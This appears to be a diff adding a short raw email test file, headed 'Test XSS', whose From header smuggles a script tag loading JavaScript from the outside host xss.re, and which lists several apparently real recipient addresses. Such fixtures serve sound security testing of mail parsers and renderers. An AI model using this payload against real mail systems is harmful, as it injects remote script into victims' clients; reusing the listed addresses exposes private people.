@@ -1,0 +1,7 @@
+From: <"test<script src=http://xss.re/7188></script>@attack.com">
+To: ksubach@afce.com, kirkw77@aol.com, kweisgerber@mindspring.com, 
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
